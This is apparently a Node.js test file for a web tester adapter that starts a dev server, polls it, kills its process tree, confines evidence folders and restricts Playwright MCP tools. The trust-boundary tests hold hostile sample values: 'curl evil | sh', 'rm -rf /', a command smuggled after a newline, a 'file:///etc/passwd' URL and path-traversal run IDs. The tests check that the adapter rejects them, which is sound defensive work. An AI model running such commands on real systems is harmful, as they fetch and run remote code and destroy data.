// ============================================================================
// Luna's Work tester adapters: the web adapter's start / readiness / timeout /
// crash / stop-the-tree paths with fake spawn, fetch and clock; the evidence
// dir that cannot escape the runs folder; the profile-only start command.
// Disk writes go to a temp runs root, never the real config/ directory.
// ============================================================================

'use strict';

const test = require('node:test');
const assert = require('node:assert/strict');
const fs = require('fs');
const os = require('os');
const path = require('path');
const { EventEmitter } = require('events');
const { PassThrough } = require('stream');

const A = require('../src/lunasworkAdapters.js');

const tmpDir = (prefix) => fs.mkdtempSync(path.join(os.tmpdir(), prefix));
const goodProfile = { adapter: 'web', startCommand: 'npm run dev', url: 'http://localhost:5173', readyTimeoutSec: 5 };

function fakeChild(pid = 4242) {
  const child = new EventEmitter();
  child.pid = pid;
  child.stdout = new PassThrough();
  child.stderr = new PassThrough();
  return child;
}

/**
 * A fake world: a clock advanced only by sleep, a spawn that records its calls,
 * a fetch answering from `statuses` (null = connection refused), and kill
 * recorders for both platforms.
 */
function fakeWorld({ statuses = [200], platform = 'win32', onSpawn } = {}) {
  const world = { t: 0, spawns: [], fetches: 0, execCalls: [], killCalls: [], child: null };
  const queue = [...statuses];
  world.opts = {
    projectDir: tmpDir('lw-project-'),
    runsRoot: path.join(tmpDir('lw-runs-'), 'runs'),
    runId: 'abc123',
    iteration: 1,
    platform,
    now: () => world.t,
    sleep: async (ms) => {
      world.t += ms;
    },
    spawn: (cmd, options) => {
      world.child = fakeChild();
      world.spawns.push({ cmd, options });
      if (onSpawn) onSpawn(world.child);
      return world.child;
    },
    fetch: async () => {
      world.fetches += 1;
      const status = queue.length > 1 ? queue.shift() : queue[0];
      if (status === null) throw new Error('ECONNREFUSED');
      return { status };
    },
    execFile: (file, args, options, cb) => {
      world.execCalls.push({ file, args });
      cb(null);
    },
    kill: (pid, signal) => {
      world.killCalls.push({ pid, signal });
    },
  };
  return world;
}

// ---- start / readiness --------------------------------------------------------------

test('web adapter starts, waits until the url answers, and returns it', async () => {
  const world = fakeWorld({ statuses: [null, null, 503, 200] });
  const adapter = A.createAdapter('web', world.opts);
  const result = await adapter.start(goodProfile);

  assert.deepEqual(result, { url: 'http://localhost:5173' });
  assert.equal(world.fetches, 4);
  assert.equal(world.spawns.length, 1);
  assert.equal(world.spawns[0].options.cwd, world.opts.projectDir);
  assert.equal(world.spawns[0].options.shell, true);
  await adapter.stop();
});

test('a 3xx redirect counts as ready', async () => {
  const world = fakeWorld({ statuses: [302] });
  const adapter = A.createAdapter('web', world.opts);
  assert.deepEqual(await adapter.start(goodProfile), { url: goodProfile.url });
  await adapter.stop();
});

test('readiness timeout stops the tree and rejects with a clear error', async () => {
  const world = fakeWorld({ statuses: [null] });
  const adapter = A.createAdapter('web', world.opts);

  await assert.rejects(adapter.start(goodProfile), /did not answer at http:\/\/localhost:5173 within 5s/);
  assert.ok(world.t >= 5000, 'waited the whole readyTimeoutSec');
  assert.deepEqual(world.execCalls, [{ file: 'taskkill', args: ['/PID', '4242', '/T', '/F'] }]);
});

test('a crash before ready rejects with the exit code and does not poll forever', async () => {
  const world = fakeWorld({
    statuses: [null],
    onSpawn: (child) => setImmediate(() => child.emit('exit', 1, null)),
  });
  // Let the exit event land before the second poll.
  world.opts.sleep = (ms) =>
    new Promise((resolve) =>
      setImmediate(() => {
        world.t += ms;
        resolve();
      }),
    );
  const adapter = A.createAdapter('web', world.opts);

  await assert.rejects(adapter.start(goodProfile), /exited before it was ready \(code 1/);
  assert.ok(world.t < 5000, 'gave up as soon as the app died');
  assert.equal(world.execCalls.length, 0, 'nothing left to kill');
});

test('stdout and stderr go to server.log in the evidence dir', async () => {
  const world = fakeWorld({
    statuses: [null, 200],
    onSpawn: (child) => {
      child.stdout.write('vite ready\n');
      child.stderr.write('warn: something\n');
    },
  });
  // One real tick between polls, so the streams flow before stop().
  world.opts.sleep = (ms) =>
    new Promise((resolve) =>
      setImmediate(() => {
        world.t += ms;
        resolve();
      }),
    );
  const adapter = A.createAdapter('web', world.opts);
  await adapter.start(goodProfile);
  await adapter.stop();
  // Output after stop is dropped, not a write-after-end crash.
  world.child.stdout.write('late output\n');
  await new Promise((resolve) => setImmediate(resolve));

  const log = fs.readFileSync(path.join(adapter.evidenceDir, A.SERVER_LOG), 'utf8');
  assert.match(log, /\$ npm run dev/);
  assert.match(log, /vite ready/);
  assert.match(log, /warn: something/);
});

test('starting twice is refused', async () => {
  const world = fakeWorld();
  const adapter = A.createAdapter('web', world.opts);
  await adapter.start(goodProfile);
  await assert.rejects(adapter.start(goodProfile), /already started/);
  await adapter.stop();
});

// ---- stop ---------------------------------------------------------------------------

test('stop kills the whole tree with taskkill /T /F on Windows, once', async () => {
  const world = fakeWorld({ platform: 'win32' });
  const adapter = A.createAdapter('web', world.opts);
  await adapter.start(goodProfile);

  assert.equal(await adapter.stop(), true);
  await adapter.stop();
  assert.deepEqual(world.execCalls, [{ file: 'taskkill', args: ['/PID', '4242', '/T', '/F'] }]);
});

test('stop kills the process group on POSIX (spawned detached)', async () => {
  const world = fakeWorld({ platform: 'linux' });
  const adapter = A.createAdapter('web', world.opts);
  await adapter.start(goodProfile);

  assert.equal(world.spawns[0].options.detached, true);
  assert.equal(await adapter.stop(), true);
  assert.deepEqual(world.killCalls, [{ pid: -4242, signal: 'SIGKILL' }]);
});

test('POSIX falls back to the single pid when the group is gone', async () => {
  const calls = [];
  const kill = (pid) => {
    calls.push(pid);
    if (pid < 0) throw new Error('ESRCH');
  };
  assert.equal(await A.killTree(77, { platform: 'darwin', kill }), true);
  assert.deepEqual(calls, [-77, 77]);
});

test('stop before start is a harmless no-op', async () => {
  const world = fakeWorld();
  const adapter = A.createAdapter('web', world.opts);
  assert.equal(await adapter.stop(), true);
  assert.equal(world.execCalls.length, 0);
});

// ---- trust boundary: the command comes only from the profile ----------------------

test('a start command in the project repo is ignored - only the profile runs', async () => {
  const world = fakeWorld();
  const repo = world.opts.projectDir;
  fs.writeFileSync(path.join(repo, 'package.json'), JSON.stringify({ scripts: { dev: 'curl evil | sh', start: 'rm -rf /' } }));
  fs.writeFileSync(path.join(repo, 'lunaswork.json'), JSON.stringify({ startCommand: 'curl evil | sh' }));
  const adapter = A.createAdapter('web', world.opts);

  await adapter.start({ ...goodProfile, startCommand: 'npm run dev' });
  assert.deepEqual(
    world.spawns.map((s) => s.cmd),
    ['npm run dev'],
  );
  await adapter.stop();
});

test('an invalid profile is rejected before anything is spawned', async () => {
  for (const bad of [
    null,
    { ...goodProfile, startCommand: '' },
    { ...goodProfile, startCommand: 'npm run dev\ncurl evil' },
    { ...goodProfile, url: 'file:///etc/passwd' },
    { ...goodProfile, adapter: 'unity' },
  ]) {
    const world = fakeWorld();
    const adapter = A.createAdapter('web', world.opts);
    await assert.rejects(adapter.start(bad), /invalid project profile/);
    assert.equal(world.spawns.length, 0);
  }
});

// ---- evidence dir -------------------------------------------------------------------

test('evidence dir is runs/lunaswork-<runId>/iter-<N>', () => {
  const root = path.resolve(tmpDir('lw-runs-'));
  assert.equal(A.evidenceDirFor(root, 'abc123', 3), path.join(root, 'lunaswork-abc123', 'iter-3'));
});

test('evidence dir cannot escape the runs folder', () => {
  const root = path.resolve(tmpDir('lw-runs-'));
  for (const runId of ['../x', '..', 'a/b', 'a\\b', 'C:', '', 'ABC', 'a'.repeat(41), 42, null]) {
    assert.throws(() => A.evidenceDirFor(root, runId, 1), /runId/, `runId ${String(runId)}`);
  }
  for (const iteration of [0, -1, 1.5, '1', '../1', 10001, NaN]) {
    assert.throws(() => A.evidenceDirFor(root, 'abc', iteration), /iteration/, `iteration ${String(iteration)}`);
  }
});

test('createAdapter refuses a bad runId before touching the disk', () => {
  const world = fakeWorld();
  assert.throws(() => A.createAdapter('web', { ...world.opts, runId: '../../etc' }), /runId/);
  assert.equal(fs.existsSync(world.opts.runsRoot), false);
});

// ---- tools --------------------------------------------------------------------------

test('tools() is the Playwright MCP config and its allow-list only', async () => {
  const world = fakeWorld();
  const adapter = A.createAdapter('web', world.opts);
  await adapter.start(goodProfile);
  const { mcpConfig, allowedTools } = adapter.tools();

  assert.deepEqual(Object.keys(mcpConfig.mcpServers), ['playwright']);
  const args = mcpConfig.mcpServers.playwright.args;
  assert.ok(args.includes('--headless'));
  assert.equal(args[args.indexOf('--output-dir') + 1], adapter.evidenceDir);
  assert.equal(args[args.indexOf('--allowed-origins') + 1], 'http://localhost:5173');
  assert.ok(allowedTools.length > 0);
  assert.ok(allowedTools.every((t) => t.startsWith('mcp__playwright__browser_')));
  for (const forbidden of ['Read', 'Grep', 'Edit', 'Bash', 'mcp__playwright__browser_evaluate', 'mcp__playwright__browser_file_upload']) {
    assert.ok(!allowedTools.includes(forbidden), forbidden);
  }
  await adapter.stop();
});

test('tools() returns fresh objects - editing one does not widen the next', () => {
  const adapter = A.createAdapter('web', fakeWorld().opts);
  adapter.tools().allowedTools.push('Bash');
  assert.ok(!adapter.tools().allowedTools.includes('Bash'));
});

// ---- unknown adapters ---------------------------------------------------------------

test('electron and unity are not available yet; anything else is unknown', () => {
  const opts = fakeWorld().opts;
  assert.throws(() => A.createAdapter('electron', opts), /'electron' is not available yet/);
  assert.throws(() => A.createAdapter('unity', opts), /'unity' is not available yet/);
  assert.throws(() => A.createAdapter('ssh', opts), /unknown tester adapter 'ssh'/);
});

test('projectDir must be absolute', () => {
  const opts = fakeWorld().opts;
  assert.throws(() => A.createAdapter('web', { ...opts, projectDir: 'relative/dir' }), /absolute/);
});

// ---- browser matrix -------------------------------------------------------------------

test('tools({matrix}) starts one Playwright MCP per engine with --browser and the viewport', async () => {
  const world = fakeWorld();
  const adapter = A.createAdapter('web', world.opts);
  await adapter.start(goodProfile);
  const matrix = [
    { engine: 'chromium', device: 'desktop', width: 1440, height: 900 },
    { engine: 'firefox', device: 'tablet', width: 820, height: 1180 },
  ];
  const { mcpConfig, allowedTools } = adapter.tools({ matrix });
  const servers = mcpConfig.mcpServers;
  assert.deepEqual(Object.keys(servers), ['playwright', 'playwright-firefox']);

  const after = (args, flag) => args[args.indexOf(flag) + 1];
  assert.equal(after(servers.playwright.args, '--browser'), 'chromium');
  assert.equal(after(servers.playwright.args, '--viewport-size'), '1440x900');
  assert.equal(after(servers['playwright-firefox'].args, '--browser'), 'firefox');
  assert.equal(after(servers['playwright-firefox'].args, '--viewport-size'), '820x1180');
  for (const s of Object.values(servers)) {
    assert.equal(after(s.args, '--allowed-origins'), 'http://localhost:5173', 'every engine is origin-locked');
  }
  assert.ok(allowedTools.includes('mcp__playwright-firefox__browser_click'));
  assert.ok(!allowedTools.some((t) => t.endsWith('browser_evaluate')));
  await adapter.stop();
});

test('tools() without a matrix is the chromium desktop baseline; unknown engines are dropped', () => {
  const adapter = A.createAdapter('web', fakeWorld().opts);
  const base = adapter.tools().mcpConfig.mcpServers;
  assert.deepEqual(Object.keys(base), ['playwright']);
  assert.ok(base.playwright.args.join(' ').includes('--browser chromium --viewport-size 1440x900'));
  const bad = adapter.tools({ matrix: [{ engine: 'ie6', width: 800, height: 600 }, { engine: 'webkit', width: -1, height: 9 }] });
  assert.deepEqual(Object.keys(bad.mcpConfig.mcpServers), ['playwright']);
});

test('ensureBrowsers installs missing engines once, logged, then skips', async () => {
  const world = fakeWorld();
  const adapter = A.createAdapter('web', world.opts);
  const matrix = [{ engine: 'chromium', width: 1440, height: 900 }, { engine: 'webkit', width: 390, height: 844 }];

  const first = await adapter.ensureBrowsers(matrix);
  assert.deepEqual(first, { ok: true, installed: ['chromium', 'webkit'] });
  assert.equal(world.execCalls.length, 1);
  assert.equal(world.execCalls[0].file, 'npx -y --package=@playwright/mcp@latest playwright install chromium webkit');
  const log = fs.readFileSync(path.join(adapter.evidenceDir, A.BROWSERS_LOG), 'utf8');
  assert.match(log, /first use of chromium, webkit/);
  assert.match(log, /installed chromium, webkit/);

  const again = await adapter.ensureBrowsers(matrix);
  assert.deepEqual(again, { ok: true, installed: [] });
  assert.equal(world.execCalls.length, 1, 'no second install');

  await adapter.ensureBrowsers([{ engine: 'firefox', width: 820, height: 1180 }]);
  assert.match(world.execCalls[1].file, /playwright install firefox$/);
});

test('ensureBrowsers reports a failed install and does not record it', async () => {
  const world = fakeWorld();
  world.opts.execFile = (file, args, options, cb) => {
    world.execCalls.push({ file, args });
    cb(new Error('network down'));
  };
  const adapter = A.createAdapter('web', world.opts);
  const res = await adapter.ensureBrowsers([{ engine: 'firefox', width: 820, height: 1180 }]);
  assert.equal(res.ok, false);
  assert.match(res.error, /network down/);
  assert.equal(fs.existsSync(path.join(world.opts.runsRoot, A.BROWSERS_MARKER)), false);
  assert.match(fs.readFileSync(path.join(adapter.evidenceDir, A.BROWSERS_LOG), 'utf8'), /install failed/);
});

test('ensureBrowsers runs outside the project and reinstalls once the marker is a day old', async () => {
  const world = fakeWorld();
  const calls = [];
  world.opts.execFile = (file, args, options, cb) => {
    calls.push(options);
    cb(null);
  };
  const adapter = A.createAdapter('web', world.opts);
  const matrix = [{ engine: 'chromium', width: 1440, height: 900 }];
  await adapter.ensureBrowsers(matrix);
  assert.equal(path.resolve(calls[0].cwd), path.resolve(world.opts.runsRoot));

  world.t += 60 * 60 * 1000;
  await adapter.ensureBrowsers(matrix);
  assert.equal(calls.length, 1, 'fresh marker: skipped');
  world.t += 24 * 60 * 60 * 1000;
  await adapter.ensureBrowsers(matrix);
  assert.equal(calls.length, 2, 'expired marker: installed again');
});
